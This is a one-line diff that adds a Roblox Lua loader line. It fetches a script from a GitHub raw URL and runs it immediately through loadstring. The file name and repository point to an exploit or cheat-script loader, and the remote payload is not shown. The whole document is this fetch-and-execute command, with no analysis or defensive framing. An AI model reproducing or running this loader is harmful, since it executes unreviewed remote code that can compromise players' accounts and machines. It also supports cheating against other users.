@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/apple-ipad-original-spam6-x00mulqxkx86px.lua"))()
